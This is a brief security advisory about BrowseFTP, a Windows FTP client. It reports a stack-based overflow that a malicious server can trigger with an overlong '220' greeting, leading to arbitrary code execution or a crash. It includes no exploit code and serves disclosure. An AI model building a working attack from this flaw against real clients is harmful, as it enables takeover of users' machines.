BrowseFTP is an ftp client that runs on various Microsoft Windows operating systems.

An issue has been reported which could allow for a malicious ftp server to execute arbitrary code on a BrowseFTP client user.

This is acheivable when a BrowseFTP user connects to an ftp host, if the FTP server '220' response is of excessive length. The stack-based overflow condition can allow for malicious administrators to execute arbitrary code on (and gain control of) client hosts. It is also possible to crash the client.
